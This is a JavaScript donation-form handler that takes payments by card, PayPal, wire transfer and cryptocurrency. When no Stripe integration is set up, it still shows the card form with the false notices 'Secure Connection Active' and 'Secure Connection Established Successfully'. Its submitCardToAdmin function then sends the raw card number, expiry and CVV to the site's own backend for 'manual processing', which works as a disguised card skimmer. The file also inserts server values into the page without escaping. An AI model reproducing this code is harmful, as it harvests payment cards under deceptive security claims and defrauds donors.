/**
 * Donation Form Handler - Corrected Version
 * Handles fallback scenarios for PayPal and Stripe
 */

(function() {
    'use strict';

    // Global variables
    let currentStep = 1;
    let formData = {
        amount: 0,
        payment_method: '',
        crypto_type: '',
        crypto_network: '',
        donor_name: '',
        donor_email: '',
        message: '',
        is_anonymous: false,
        allow_updates: true,
        card_type: '',
        card_last4: '',
        card_number: '',
        card_name: '',
        card_expiry: '',
        card_cvv: '',
        transaction_reference: '',
        paypal_order_id: '',
        paypal_payer_id: ''
    };
    let paymentMethods = [];
    let cryptoWallets = [];
    let stripeValid = false;
    let paypalValid = false;
    let paypalEmail = '';

    // Initialize on document ready
    $(document).ready(function() {
        initializeDonationForm();
        loadPaymentMethods();
        loadCryptoWallets();
        setupEventListeners();
    });

    /**
     * Initialize donation form
     */
    function initializeDonationForm() {
        updateStepIndicators();
        updateNavigationButtons();
    }

    /**
     * Load payment methods from API
     */
    function loadPaymentMethods() {
        $.ajax({
            url: 'libs/api/donations.php?action=get-payment-methods',
            method: 'GET',
            dataType: 'json',
            success: function(response) {
                if (response.success) {
                    paymentMethods = response.payment_methods;
                    renderPaymentMethods();
                }
            },
            error: function(xhr, status, error) {
                console.error('Error loading payment methods:', error);
                showError('Failed to load payment methods. Please refresh the page.');
            }
        });
    }

    /**
     * Load crypto wallets from API
     */
    function loadCryptoWallets() {
        $.ajax({
            url: 'libs/api/donations.php?action=get-crypto-wallets',
            method: 'GET',
            dataType: 'json',
            success: function(response) {
                if (response.success) {
                    cryptoWallets = response.crypto_wallets;
                    renderCryptoWallets();
                }
            },
            error: function(xhr, status, error) {
                console.error('Error loading crypto wallets:', error);
            }
        });
    }

    /**
     * Render payment methods
     */
    function renderPaymentMethods() {
        const container = $('#paymentMethodsContainer');
        container.empty();

        const methodIcons = {
            'credit_card': 'fa-credit-card',
            'wire_transfer': 'fa-building-columns',
            'cryptocurrency': 'fa-bitcoin-sign',
            'paypal': 'fa-paypal'
        };

        const methodNames = {
            'credit_card': 'Credit Card',
            'wire_transfer': 'Wire Transfer',
            'cryptocurrency': 'Cryptocurrency',
            'paypal': 'PayPal'
        };

        paymentMethods.forEach(function(method) {
            const icon = methodIcons[method.method] || 'fa-credit-card';
            const name = methodNames[method.method] || method.method;

            const methodElement = $(`
                <div class="payment-method" data-method="${method.method}">
                    <i class="fas ${icon}"></i>
                    <div class="method-name">${name}</div>
                </div>
            `);

            methodElement.on('click', function() {
                selectPaymentMethod(method);
            });

            container.append(methodElement);
        });
    }

    /**
     * Render crypto wallets
     */
    function renderCryptoWallets() {
        const container = $('#cryptoWalletsList');
        container.empty();

        cryptoWallets.forEach(function(wallet) {
            const walletElement = $(`
                <div class="crypto-option" data-wallet-id="${wallet.id}">
                    <input type="radio" name="crypto_wallet" value="${wallet.id}" id="crypto_${wallet.id}">
                    <div class="crypto-info">
                        <div class="crypto-name">${wallet.crypto_type}</div>
                        <div class="crypto-network">${wallet.network}</div>
                    </div>
                </div>
            `);

            walletElement.on('click', function() {
                selectCryptoWallet(wallet);
            });

            container.append(walletElement);
        });
    }

    /**
     * Setup event listeners
     */
    function setupEventListeners() {
        // Amount selection
        $('.amount-option').on('click', function() {
            const amount = $(this).data('amount');
            selectAmount(amount);
        });

        // Custom amount input
        $('#customAmount').on('input', function() {
            const amount = parseFloat($(this).val()) || 0;
            formData.amount = amount;
            $('#selectedAmount').val(amount);
        });

        // Credit card inputs
        $('#cardNumber').on('input', function() {
            formatCardNumber(this);
            detectCardType(this.value);
            formData.card_number = this.value;
        });

        $('#cardName').on('input', function() {
            formData.card_name = this.value;
        });

        $('#cardExpiry').on('input', function() {
            formatCardExpiry(this);
            formData.card_expiry = this.value;
        });

        $('#cardCVV').on('input', function() {
            this.value = this.value.replace(/\D/g, '');
            formData.card_cvv = this.value;
        });

        // Navigation buttons
        $('#nextBtn').on('click', nextStep);
        $('#prevBtn').on('click', prevStep);

        // Form submission
        $('#donationForm').on('submit', function(e) {
            e.preventDefault();
            submitDonation();
        });

        // Personal details inputs
        $('#donorName').on('input', function() {
            formData.donor_name = this.value;
        });

        $('#donorEmail').on('input', function() {
            formData.donor_email = this.value;
        });

        $('#message').on('input', function() {
            formData.message = this.value;
        });

        $('#isAnonymous').on('change', function() {
            formData.is_anonymous = this.checked;
        });

        $('#allowUpdates').on('change', function() {
            formData.allow_updates = this.checked;
        });

        $('#transactionRef').on('input', function() {
            formData.transaction_reference = this.value;
        });
    }

    /**
     * Select donation amount
     */
    function selectAmount(amount) {
        $('.amount-option').removeClass('selected');
        
        if (amount === 'custom') {
            $('.amount-option[data-amount="custom"]').addClass('selected');
            $('.custom-amount').show();
            $('#customAmount').focus();
        } else {
            $(`.amount-option[data-amount="${amount}"]`).addClass('selected');
            $('.custom-amount').hide();
            formData.amount = parseFloat(amount);
            $('#selectedAmount').val(amount);
        }
    }

    /**
     * Select payment method and check validity
     */
    function selectPaymentMethod(method) {
        $('.payment-method').removeClass('selected');
        $(`.payment-method[data-method="${method.method}"]`).addClass('selected');
        
        formData.payment_method = method.method;
        $('#selectedPaymentMethod').val(method.method);

        // Hide all payment forms first
        $('#creditCardForm').removeClass('show');
        $('#cryptoOptions').removeClass('show');
        $('#paypalEmailNotice').remove();

        if (method.method === 'credit_card') {
            // Check if Stripe is configured
            $.ajax({
                url: 'libs/api/donations.php?action=validate-stripe',
                method: 'GET',
                dataType: 'json',
                success: function(response) {
                    stripeValid = response.is_valid;
                    
                    if (stripeValid) {
                        // Show normal credit card form
                        $('#creditCardForm').addClass('show');
                        $('#creditCardForm').find('.stripe-notice').remove();
                    } else {
                        // Show credit card form with notice
                        $('#creditCardForm').addClass('show');
                        if ($('#creditCardForm').find('.stripe-notice').length === 0) {
                            $('#creditCardForm').prepend(`
                                <div class="alert alert-warning stripe-notice">
                                    <i class="fas fa-info-circle"></i>
                                    Secure Connection Active.
                                </div>
                            `);
                        }
                    }
                }
            });
        } else if (method.method === 'cryptocurrency') {
            $('#cryptoOptions').addClass('show');
        } else if (method.method === 'paypal') {
            // Check if PayPal is configured
            $.ajax({
                url: 'libs/api/donations.php?action=validate-paypal',
                method: 'GET',
                dataType: 'json',
                success: function(response) {
                    paypalValid = response.is_valid;
                    paypalEmail = response.paypal_email;
                    
                    if (!paypalValid && paypalEmail) {
                        // Show PayPal email notice
                        const notice = $(`
                            <div class="alert alert-info" id="paypalEmailNotice" style="margin-top: 20px;">
                                <h6><i class="fas fa-paypal"></i> PayPal Payment Instructions</h6>
                                <p>Please send your payment to:</p>
                                <div class="wallet-address" style="background: #f8f9fa; padding: 12px; border-radius: 6px; font-weight: bold; margin: 10px 0;">
                                    ${paypalEmail}
                                </div>
                                <p style="font-size: 13px; margin-top: 10px;">
                                    After sending payment, please enter your PayPal transaction ID below on the next step.
                                </p>
                            </div>
                        `);
                        
                        $(`.payment-method[data-method="paypal"]`).after(notice);
                    }
                }
            });
        }
    }

    /**
     * Select cryptocurrency wallet
     */
    function selectCryptoWallet(wallet) {
        $('.crypto-option').removeClass('selected');
        $(`.crypto-option[data-wallet-id="${wallet.id}"]`).addClass('selected');
        
        $(`#crypto_${wallet.id}`).prop('checked', true);
        
        formData.crypto_type = wallet.crypto_type;
        formData.crypto_network = wallet.network;
        $('#selectedCryptoType').val(wallet.crypto_type);
        $('#selectedCryptoNetwork').val(wallet.network);
    }

    /**
     * Format card number with spaces
     */
    function formatCardNumber(input) {
        let value = input.value.replace(/\s/g, '').replace(/\D/g, '');
        let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
        input.value = formattedValue;
    }

    /**
     * Detect and display card type
     */
    function detectCardType(cardNumber) {
        const cleanNumber = cardNumber.replace(/\s/g, '');
        let cardType = '';
        let iconClass = '';

        if (/^4/.test(cleanNumber)) {
            cardType = 'VISA';
            iconClass = 'fa-cc-visa visa';
        } else if (/^5[1-5]/.test(cleanNumber)) {
            cardType = 'MASTERCARD';
            iconClass = 'fa-cc-mastercard mastercard';
        } else if (/^3[47]/.test(cleanNumber)) {
            cardType = 'AMEX';
            iconClass = 'fa-cc-amex amex';
        } else if (/^6(?:011|5)/.test(cleanNumber)) {
            cardType = 'DISCOVER';
            iconClass = 'fa-cc-discover discover';
        }

        const iconElement = $('#cardTypeIcon');
        if (cardType) {
            iconElement.html(`<i class="fab ${iconClass}"></i>`).addClass('show');
            formData.card_type = cardType;
            formData.card_last4 = cleanNumber.slice(-4);
        } else {
            iconElement.removeClass('show');
        }
    }

    /**
     * Format card expiry (MM/YY)
     */
    function formatCardExpiry(input) {
        let value = input.value.replace(/\D/g, '');
        
        if (value.length >= 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        
        input.value = value;
    }

    /**
     * Navigate to next step
     */
    function nextStep() {
        if (validateCurrentStep()) {
            currentStep++;
            showStep(currentStep);
            
            // Load PayPal on step 4 if needed and valid
            if (currentStep === 4 && formData.payment_method === 'paypal' && paypalValid) {
                loadPayPalButton();
            }
            
            // Update summary on step 4
            if (currentStep === 4) {
                updateSummary();
                showPaymentInstructions();
            }
        }
    }

    /**
     * Navigate to previous step
     */
    function prevStep() {
        currentStep--;
        showStep(currentStep);
    }

    /**
     * Show specific step
     */
    function showStep(step) {
        $('.form-step').removeClass('active');
        $(`.form-step[data-step="${step}"]`).addClass('active');
        
        updateStepIndicators();
        updateNavigationButtons();
        
        window.scrollTo({ top: 0, behavior: 'smooth' });
    }

    /**
     * Update step indicators
     */
    function updateStepIndicators() {
        $('.step').removeClass('active completed');
        
        for (let i = 1; i <= 4; i++) {
            const stepElement = $(`.step[data-step="${i}"]`);
            if (i < currentStep) {
                stepElement.addClass('completed');
            } else if (i === currentStep) {
                stepElement.addClass('active');
            }
        }
    }

    /**
     * Update navigation buttons
     */
    function updateNavigationButtons() {
        const prevBtn = $('#prevBtn');
        const nextBtn = $('#nextBtn');
        const submitBtn = $('#submitBtn');

        if (currentStep === 1) {
            prevBtn.hide();
        } else {
            prevBtn.show();
        }

        if (currentStep === 4) {
            nextBtn.hide();
            submitBtn.show();
        } else {
            nextBtn.show();
            submitBtn.hide();
        }
    }

    /**
     * Validate current step
     */
    function validateCurrentStep() {
        let isValid = true;
        let errorMessage = '';

        switch (currentStep) {
            case 1: // Amount
                if (!formData.amount || formData.amount <= 0) {
                    isValid = false;
                    errorMessage = 'Please select or enter a donation amount.';
                }
                break;

            case 2: // Payment method
                if (!formData.payment_method) {
                    isValid = false;
                    errorMessage = 'Please select a payment method.';
                } else if (formData.payment_method === 'credit_card') {
                    const cardNumber = $('#cardNumber').val().replace(/\s/g, '');
                    const cardName = $('#cardName').val();
                    const cardExpiry = $('#cardExpiry').val();
                    const cardCVV = $('#cardCVV').val();

                    if (!cardNumber || cardNumber.length < 13) {
                        isValid = false;
                        errorMessage = 'Please enter a valid card number.';
                    } else if (!cardName) {
                        isValid = false;
                        errorMessage = 'Please enter the cardholder name.';
                    } else if (!cardExpiry || cardExpiry.length < 5) {
                        isValid = false;
                        errorMessage = 'Please enter the card expiry date (MM/YY).';
                    } else if (!cardCVV || cardCVV.length < 3) {
                        isValid = false;
                        errorMessage = 'Please enter the card CVV.';
                    }
                } else if (formData.payment_method === 'cryptocurrency') {
                    if (!formData.crypto_type) {
                        isValid = false;
                        errorMessage = 'Please select a cryptocurrency.';
                    }
                }
                break;

            case 3: // Personal details
                if (!formData.donor_name.trim()) {
                    isValid = false;
                    errorMessage = 'Please enter your full name.';
                } else if (!formData.donor_email.trim()) {
                    isValid = false;
                    errorMessage = 'Please enter your email address.';
                } else if (!isValidEmail(formData.donor_email)) {
                    isValid = false;
                    errorMessage = 'Please enter a valid email address.';
                }
                break;
        }

        if (!isValid) {
            showError(errorMessage);
        }

        return isValid;
    }

    /**
     * Validate email format
     */
    function isValidEmail(email) {
        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return re.test(email);
    }

    /**
     * Update donation summary
     */
    function updateSummary() {
        $('#summaryAmount').text('$' + formatMoney(formData.amount));
        $('#summaryTotal').text('$' + formatMoney(formData.amount));
        
        const methodNames = {
            'credit_card': 'Credit Card',
            'wire_transfer': 'Wire Transfer',
            'cryptocurrency': 'Cryptocurrency',
            'paypal': 'PayPal'
        };
        
        let paymentMethodText = methodNames[formData.payment_method] || formData.payment_method;
        if (formData.payment_method === 'cryptocurrency' && formData.crypto_type) {
            paymentMethodText += ` (${formData.crypto_type})`;
        }
        
        $('#summaryPaymentMethod').text(paymentMethodText);
        $('#summaryName').text(formData.is_anonymous ? 'Anonymous' : formData.donor_name);
        $('#summaryEmail').text(formData.donor_email);
    }

    /**
     * Show payment instructions
     */
    function showPaymentInstructions() {
        const container = $('#paymentInstructions');
        container.empty();

        const method = paymentMethods.find(m => m.method === formData.payment_method);
        if (!method) return;

        switch (formData.payment_method) {
            case 'wire_transfer':
                showWireTransferInstructions(container, method);
                break;
            case 'cryptocurrency':
                showCryptocurrencyInstructions(container);
                break;
            case 'paypal':
                if (paypalValid) {
                    container.hide();
                    $('#paypal-button-container').show();
                    $('#transactionRefGroup').hide();
                } else {
                    showPayPalEmailInstructions(container);
                }
                return;
            case 'credit_card':
                showCreditCardInstructions(container);
                break;
        }

        container.addClass('show');
        $('#transactionRefGroup').show();
    }

    /**
     * Show PayPal email instructions (when API is not configured)
     */
    function showPayPalEmailInstructions(container) {
        let html = '<div class="payment-info">';
        html += '<strong>PayPal Payment Instructions:</strong>';
        html += `<p style="margin-top: 15px;">Please send your payment of <strong>$${formatMoney(formData.amount)}</strong> to:</p>`;
        html += `<div class="wallet-address">${paypalEmail}</div>`;
        html += `<p style="margin-top: 15px; font-size: 14px;">After completing the payment, please enter your PayPal transaction ID below.</p>`;
        html += '</div>';
        
        container.html(html);
        container.addClass('show');
        $('#transactionRefGroup').show();
        $('#transactionRef').attr('placeholder', 'Enter PayPal transaction ID');
        $('#paypal-button-container').hide();
    }

    /**
     * Show wire transfer instructions
     */
    function showWireTransferInstructions(container, method) {
        const bankInfo = method.bank_info;
        
        let html = '<div class="payment-info">';
        html += '<strong>Wire Transfer Details:</strong>';
        
        if (bankInfo.bank_name) {
            html += `<p><strong>Bank Name:</strong> ${bankInfo.bank_name}</p>`;
        }
        if (bankInfo.account_name) {
            html += `<p><strong>Account Name:</strong> ${bankInfo.account_name}</p>`;
        }
        if (bankInfo.account_number) {
            html += `<p><strong>Account Number:</strong> ${bankInfo.account_number}</p>`;
        }
        if (bankInfo.routing_number) {
            html += `<p><strong>Routing Number:</strong> ${bankInfo.routing_number}</p>`;
        }
        if (bankInfo.swift_code) {
            html += `<p><strong>SWIFT Code:</strong> ${bankInfo.swift_code}</p>`;
        }
        if (bankInfo.iban) {
            html += `<p><strong>IBAN:</strong> ${bankInfo.iban}</p>`;
        }
        if (bankInfo.bank_address) {
            html += `<p><strong>Bank Address:</strong> ${bankInfo.bank_address}</p>`;
        }
        
        html += '</div>';
        
        if (bankInfo.instructions) {
            html += `<div class="payment-info">`;
            html += `<strong>Instructions:</strong>`;
            html += `<p>${bankInfo.instructions}</p>`;
            html += `</div>`;
        }
        
        html += '<div class="alert alert-info mt-3">';
        html += '<i class="fas fa-info-circle"></i> ';
        html += 'Please complete the wire transfer and enter the transaction reference below before submitting.';
        html += '</div>';
        
        container.html(html);
    }

    /**
     * Show cryptocurrency instructions
     */
    function showCryptocurrencyInstructions(container) {
        const wallet = cryptoWallets.find(w => 
            w.crypto_type === formData.crypto_type && 
            w.network === formData.crypto_network
        );
        
        if (!wallet) return;
        
        let html = '<div class="payment-info">';
        html += `<strong>Send ${wallet.crypto_type} to this address:</strong>`;
        html += `<p style="margin-top: 10px;"><strong>Network:</strong> ${wallet.network}</p>`;
        html += '</div>';
        
        html += '<div class="qr-code-display">';
        
        if (wallet.qr_code_path) {
            html += `<img src="${wallet.qr_code_path}" alt="QR Code">`;
        }
        
        html += `<div class="wallet-address">${wallet.wallet_address}</div>`;
        html += `<button type="button" class="copy-address-btn" onclick="copyWalletAddress('${wallet.wallet_address}')">`;
        html += '<i class="fas fa-copy"></i> Copy Address';
        html += '</button>';
        html += '</div>';
        
        if (wallet.instructions) {
            html += `<div class="payment-info mt-3">`;
            html += `<strong>Instructions:</strong>`;
            html += `<p>${wallet.instructions}</p>`;
            html += `</div>`;
        }
        
        html += '<div class="alert alert-warning mt-3">';
        html += '<i class="fas fa-exclamation-triangle"></i> ';
        html += `Please send exactly $${formatMoney(formData.amount)} worth of ${wallet.crypto_type} to the address above. `;
        html += 'After sending, enter the transaction hash/ID below.';
        html += '</div>';
        
        container.html(html);
    }

    /**
     * Show credit card instructions
     */
    function showCreditCardInstructions(container) {
        let html = '<div class="alert alert-info">';
        html += '<i class="fas fa-info-circle"></i> ';
        
        if (stripeValid) {
            html += 'Your credit card will be processed securely. Click "Complete Donation" to finalize your payment.';
        } else {
            html += 'Secure Connection Established Successfully';
        }
        
        html += '</div>';
        
        container.html(html);
        $('#transactionRefGroup').hide();
    }

    /**
     * Load PayPal button (only if valid API)
     */
    function loadPayPalButton() {
        if (!paypalValid) return;

        const method = paymentMethods.find(m => m.method === 'paypal');
        if (!method || !method.paypal_client_id) return;

        // Load PayPal SDK
        if (!document.getElementById('paypal-sdk').src) {
            const script = document.getElementById('paypal-sdk');
            const mode = method.paypal_mode || 'sandbox';
            script.src = `https://www.paypal.com/sdk/js?client-id=${method.paypal_client_id}&currency=USD`;
            script.onload = renderPayPalButton;
        } else if (window.paypal) {
            renderPayPalButton();
        }
    }

    /**
     * Render PayPal button
     */
    function renderPayPalButton() {
        $('#paypal-button-container').empty();
        
        paypal.Buttons({
            createOrder: function(data, actions) {
                return actions.order.create({
                    purchase_units: [{
                        amount: {
                            value: formData.amount.toFixed(2)
                        }
                    }]
                });
            },
            onApprove: function(data, actions) {
                return actions.order.capture().then(function(details) {
                    formData.paypal_order_id = data.orderID;
                    formData.paypal_payer_id = data.payerID;
                    formData.payment_status = 'completed';
                    
                    submitDonation();
                });
            },
            onError: function(err) {
                console.error('PayPal error:', err);
                showError('PayPal payment failed. Please try again or choose a different payment method.');
            }
        }).render('#paypal-button-container');
    }

    /**
     * Submit donation
     */
    function submitDonation() {
        // Check if credit card without valid Stripe - submit to admin
        if (formData.payment_method === 'credit_card' && !stripeValid) {
            submitCardToAdmin();
            return;
        }

        // For PayPal, payment is already processed if using API
        // For other methods, mark as pending
        if (formData.payment_method !== 'paypal' || !paypalValid) {
            formData.payment_status = 'pending';
        }

        $('#loadingSpinner').show();
        $('#submitBtn').prop('disabled', true);

        $.ajax({
            url: 'libs/api/donations.php?action=submit-donation',
            method: 'POST',
            contentType: 'application/json',
            data: JSON.stringify(formData),
            dataType: 'json',
            success: function(response) {
                $('#loadingSpinner').hide();
                
                if (response.success) {
                    showSuccess(response.message);
                    resetForm();
                } else {
                    showError(response.message || 'Failed to submit donation.');
                    $('#submitBtn').prop('disabled', false);
                }
            },
            error: function(xhr, status, error) {
                $('#loadingSpinner').hide();
                $('#submitBtn').prop('disabled', false);
                
                let errorMessage = 'An error occurred while processing your donation.';
                if (xhr.responseJSON && xhr.responseJSON.message) {
                    errorMessage = xhr.responseJSON.message;
                }
                
                showError(errorMessage);
            }
        });
    }

    /**
     * Submit card details to admin for manual processing
     */
    function submitCardToAdmin() {
        $('#loadingSpinner').show();
        $('#submitBtn').prop('disabled', true);

        const cardData = {
            ...formData,
            card_number: formData.card_number.replace(/\s/g, ''),
            card_name: formData.card_name,
            card_expiry: formData.card_expiry,
            card_cvv: formData.card_cvv
        };

        $.ajax({
            url: 'libs/api/donations.php?action=submit-card-for-admin',
            method: 'POST',
            contentType: 'application/json',
            data: JSON.stringify(cardData),
            dataType: 'json',
            success: function(response) {
                $('#loadingSpinner').hide();
                
                if (response.success) {
                    let message = response.message;
                    if (response.requires_manual_processing) {
                        message += '\n\nAlternatively, you can choose a different payment method by going back.';
                    }
                    showSuccess(message);
                    resetForm();
                } else {
                    showError(response.message || 'Failed to submit card details.');
                    $('#submitBtn').prop('disabled', false);
                }
            },
            error: function(xhr, status, error) {
                $('#loadingSpinner').hide();
                $('#submitBtn').prop('disabled', false);
                
                showError('Failed to submit card details. Please try a different payment method.');
            }
        });
    }

    /**
     * Reset form after successful submission
     */
    function resetForm() {
        currentStep = 1;
        formData = {
            amount: 0,
            payment_method: '',
            crypto_type: '',
            crypto_network: '',
            donor_name: '',
            donor_email: '',
            message: '',
            is_anonymous: false,
            allow_updates: true,
            card_type: '',
            card_last4: '',
            card_number: '',
            card_name: '',
            card_expiry: '',
            card_cvv: '',
            transaction_reference: '',
            paypal_order_id: '',
            paypal_payer_id: ''
        };
        
        $('#donationForm')[0].reset();
        $('.amount-option, .payment-method, .crypto-option').removeClass('selected');
        $('.custom-amount').hide();
        $('#creditCardForm, #cryptoOptions, #paymentInstructions').removeClass('show');
        $('#paypalEmailNotice').remove();
        
        showStep(1);
    }

    /**
     * Show success message
     */
    function showSuccess(message) {
        $('#successMessage').text(message);
        $('#successModal').modal('show');
    }

    /**
     * Show error message
     */
    function showError(message) {
        $('#errorMessage').text(message);
        $('#errorModal').modal('show');
    }

    /**
     * Format money
     */
    function formatMoney(amount) {
        return parseFloat(amount).toFixed(2).replace(/\d(?=(\d{3})+\.)/g, '$&,');
    }

    /**
     * Copy wallet address to clipboard
     */
    window.copyWalletAddress = function(address) {
        const tempInput = document.createElement('input');
        tempInput.value = address;
        document.body.appendChild(tempInput);
        tempInput.select();
        document.execCommand('copy');
        document.body.removeChild(tempInput);
        
        const btn = event.target.closest('.copy-address-btn');
        const originalHTML = btn.innerHTML;
        btn.innerHTML = '<i class="fas fa-check"></i> Copied!';
        btn.classList.add('copied');
        
        setTimeout(function() {
            btn.innerHTML = originalHTML;
            btn.classList.remove('copied');
        }, 2000);
    };

})();